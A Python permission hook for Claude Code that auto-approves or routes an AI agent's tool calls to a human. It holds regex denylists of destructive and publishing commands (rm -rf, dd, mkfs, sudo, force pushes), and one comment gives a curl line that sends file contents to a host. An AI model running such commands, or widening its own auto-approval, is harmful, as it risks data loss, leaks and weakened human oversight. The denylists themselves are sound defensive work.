#!/usr/bin/env python3
"""crew-permission: decide Claude Code permission prompts in-process.

Runs on the PermissionRequest hook with the pending tool call as JSON on stdin.
It replaces the shell approvers (hub/fast-approve-hubroute.sh), which scraped
the screen and pressed keys. Every failure that design had — NUL bytes in the
scrape, approvers expiring, duplicates racing to pick "No", keystrokes that
never landed — needs a screen or a separate process, and this has neither.

MODES, read from ~/.crew/permission-mode on every call (no restart needed):
  shadow  (default) log the decision it WOULD make; print nothing. The dialog
          behaves exactly as it does without this hook.
  decide  print an "allow" for calls the policy allows. Anything else prints
          nothing, so the normal dialog shows and a human decides.

It never prints "deny". The safe outcome is always "ask a human", not refusal.

FAIL-OPEN BY CONSTRUCTION. Any error means exit 0 with nothing on stdout, and
Claude Code then shows the normal dialog. A broken hook therefore falls back to
today's manual prompt, never to auto-allow. A hook that misbehaves gates every
session on this Mac (crew-hook.py, line 13).

POLICY (in line with what the approvers already allowed, plus one new class):
  publish     store submits, releases, pushes, deploys, outbound mail → ASK.
              Never allowed by a hook or a peer. Added 2026-10-01 after the
              fleet review: four Play releases and an App Store submit went out
              on relayed authorisations that no worker could check.
  destructive the approver's pattern, same scrubs → ASK.
  Bash        anything else → allow (what the approver did).
  Edit/Write  inside the session's repo or its scratchpad → allow; else ASK.
  WebFetch / WebSearch / claude-in-chrome → allow (approver parity; read-only
              or already approved per action).
  anything unrecognised → ASK.

Every call is logged to ~/.claude/status/_permreq.jsonl, which is the shadow
comparison and the record of what the hook let through.
"""
import json, os, re, subprocess, sys, time

HOME      = os.environ.get("CREW_HOME") or os.path.expanduser("~")
MODE_FILE = os.path.join(HOME, ".crew", "permission-mode")
LOG       = os.path.join(HOME, ".claude", "status", "_permreq.jsonl")
SCRATCH   = "/private/tmp/claude-501/"
# Where the Telegram plugin drops photos kaolin sends. The hub relays the PATH
# to the owning worker, so every screenshot he sends used to block that worker
# on an `unrecognised` Read until a human pressed it.
TG_INBOX  = os.path.join(HOME, ".claude", "channels", "telegram", "inbox")

DESTRUCTIVE = re.compile(
    r"rm +-[rf]|--force|force-with-lease|reset +--hard|--hard|git +clean|git +checkout +--|git +restore"
    r"|erase|deleteall|drop +table|truncate|git +push|push +origin|push +-|devicectl device (erase|uninstall)"
    r"|xcrun simctl (erase|delete)|launchctl (bootout|unload)|defaults +delete|security +delete|shutdown"
    r"|reboot|diskutil|mkfs|dd +if=|dd +of=|(^|[^a-z])sudo ", re.I)
# Each scrub was earned by an observed false positive (see the approver).
SCRUBS = (("--force-recreate", "FORCE_RECREATE_OK"), ("--force-device-scale-factor", "FORCE_DSF_OK"),
          # 2026-10-09: `xcrun simctl shutdown <udid>` hit the bare `shutdown`
          # alternative and asked (thereby, 07:38:40). Shutting down a simulator
          # is not shutting down the Mac, and every iOS session is REQUIRED to
          # do it when finished, so this fired on correct behaviour every time.
          # Only the two-word sequence is scrubbed: a bare `shutdown`, `sudo
          # shutdown -h now` and `simctl erase`/`delete` are all still caught.
          # The replacement must NOT contain "shutdown": DESTRUCTIVE is re.I, so
          # a token like SIMCTL_SHUTDOWN_OK re-matches itself and scrubs nothing.
          ("simctl shutdown", "SIMCTL_STOPSIM_OK"))

# Public or irreversible. Heuristic and incomplete: a python script that calls
# a store API will not match. The real control is the message-id check on
# relayed authorisations (hub-protocol.md); this is the backstop.
PUBLISH = re.compile(
    r"\bgit\s+push\b|\bgh\s+(release|pr\s+merge)\b|\bfastlane\b|\baltool\b|notarytool\s+submit"
    r"|appstoreconnect\.apple\.com|androidpublisher|\bnpm\s+publish\b|\btwine\s+upload\b"
    r"|\b(firebase|vercel|netlify|wrangler)\b.*\bdeploy\b|\bgcloud\b.*\bdeploy\b"
    r"|\bsendmail\b|\bmail\s+-s\b|submit[_-]?for[_-]?review|appStoreVersionSubmissions|reviewSubmissions"
    r"|\bpromote\b.*\b(production|prod)\b|\bdeploy\b.*\b(prod|production|live)\b", re.I)


# KNOWN GAP (the hub, 2026-10-01). PUBLISH and DESTRUCTIVE are denylists, so the
# bash class allows anything they don't name, including network egress like
# `curl https://host/?d=$(cat file)`. That isn't a regression: an armed approver
# already pressed Enter on the same commands. But it means "bash" is wider than
# it sounds. Next pass: an allowlist for bash, or a guard on curl/wget/nc/scp to
# a host that isn't allowlisted. Also: `rm -rf "$v"` where $v came from
# `mktemp -d` in the same command is scoped and shouldn't read as destructive.

# A heredoc fed to `cat`/`tee` that writes a file is TEXT, not commands.
# First shadow false positive, 2026-10-01 17:00: a brief written with
# `cat > brief.txt <<'EOF' … Never run rm -rf … EOF` read as destructive.
# Only cat/tee are scrubbed, because `bash <<EOF` or `sh <<EOF` run their body.
TEXT_HEREDOC = re.compile(
    r"(\b(?:cat|tee)\b[^\n]*?<<-?\s*['\"]?(\w+)['\"]?[^\n]*\n).*?\n\s*\2\s*(?=\n|$)", re.S)


def strip_text_heredocs(cmd):
    return TEXT_HEREDOC.sub(lambda m: m.group(1) + "HEREDOC_TEXT\n", cmd)


# Classes `decide` may actually allow. A class needs TWO things: the shadow log
# shows PermissionRequest firing for it (visibility), AND kaolin approved it in
# the scope relayed to him (safety is a separate question from firing).
# 2026-10-01: the flip was put to him as bash, edit-in-repo, edit-scratch.
# web-read (WebFetch/WebSearch) fires (17:17, rc-trial) but stays logged-only
# until he rules on it. claude-in-chrome hasn't been seen firing yet.
# 2026-10-09: read-tg-inbox added. Both conditions met — the shadow log shows
# Read firing (07:20:00, thereby, verdict ask / "unrecognised", on a screenshot
# the hub had just relayed), and kaolin ruled on exactly that prompt: Telegram
# #8961, 07:31 PDT, "Accept. Fix this. Fix being blocked like this." Scoped to
# the Telegram inbox only; every OTHER Read still returns ask ("read-other"),
# so a read of ~/keys or the ASC private key is unaffected.
DECIDE_CLASSES = {"bash", "edit-in-repo", "edit-scratch", "read-tg-inbox"}


def mode():
    try:
        with open(MODE_FILE) as f:
            m = f.read().strip()
        return m if m in ("shadow", "decide") else "shadow"
    except Exception:
        return "shadow"


def repo_root(cwd):
    try:
        out = subprocess.run(["git", "-C", cwd or ".", "rev-parse", "--show-toplevel"],
                             capture_output=True, text=True, timeout=0.5)
        return out.stdout.strip() if out.returncode == 0 else ""
    except Exception:
        return ""


def decide(d):
    """(verdict, why). verdict is 'allow' or 'ask'."""
    tool = d.get("tool_name") or ""
    inp = d.get("tool_input") if isinstance(d.get("tool_input"), dict) else {}
    if tool == "Bash":
        cmd = inp.get("command") or ""
        if PUBLISH.search(cmd):
            return "ask", "publish-class"
        s = strip_text_heredocs(cmd)
        for a, b in SCRUBS:
            s = s.replace(a, b)
        if DESTRUCTIVE.search(s):
            return "ask", "destructive"
        return "allow", "bash"
    if tool in ("Edit", "Write", "MultiEdit", "NotebookEdit"):
        p = os.path.realpath(inp.get("file_path") or inp.get("notebook_path") or "")
        if not p:
            return "ask", "edit-no-path"
        if p.startswith(SCRATCH) or p.startswith("/tmp/claude-501/"):
            return "allow", "edit-scratch"
        root = repo_root(d.get("cwd"))
        if root and (p == root or p.startswith(os.path.realpath(root) + os.sep)):
            return "allow", "edit-in-repo"
        # kaolin #10071 (2026-11-16): sessions write their own status file
        status_dir = os.path.realpath(os.path.expanduser("~/.claude/status"))
        if os.path.dirname(p) == status_dir and p.endswith(".json"):
            return "allow", "edit-status-file"
        return "ask", "edit-outside-repo"
    if tool == "Read":
        p = os.path.realpath(inp.get("file_path") or "")
        if p and (p == os.path.realpath(TG_INBOX)
                  or p.startswith(os.path.realpath(TG_INBOX) + os.sep)):
            return "allow", "read-tg-inbox"
        return "ask", "read-other"
    if tool in ("WebFetch", "WebSearch"):
        return "allow", "web-read"
    if tool.startswith("mcp__claude-in-chrome"):
        return "allow", "chrome"
    return "ask", "unrecognised"


def summary(d):
    inp = d.get("tool_input") if isinstance(d.get("tool_input"), dict) else {}
    v = inp.get("command") or inp.get("file_path") or inp.get("url") or inp.get("query") or json.dumps(inp)
    v = " ".join(str(v).split())
    return v[:300]


def main():
    d = json.loads(sys.stdin.read(4 * 1024 * 1024))
    if not isinstance(d, dict):
        return
    m = mode()
    verdict, why = decide(d)
    rec = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"), "t": round(time.time(), 3),
           "session_id": d.get("session_id"), "cwd": d.get("cwd"),
           "permission_mode": d.get("permission_mode"), "tool_name": d.get("tool_name"),
           "input": summary(d), "verdict": verdict, "why": why, "mode": m}
    try:
        os.makedirs(os.path.dirname(LOG), exist_ok=True)
        fd = os.open(LOG, os.O_WRONLY | os.O_APPEND | os.O_CREAT, 0o644)
        try:
            os.write(fd, (json.dumps(rec, ensure_ascii=False) + "\n").encode())
        finally:
            os.close(fd)
    except Exception:
        pass
    if m == "decide" and verdict == "allow" and why in DECIDE_CLASSES:
        sys.stdout.write(json.dumps({"hookSpecificOutput": {
            "hookEventName": "PermissionRequest", "decision": {"behavior": "allow"}}}))
        sys.stdout.flush()


if __name__ == "__main__":
    try:
        main()
    except BaseException:   # noqa: BLE001 — fail open: no output means the dialog shows
        pass
    finally:
        os._exit(0)
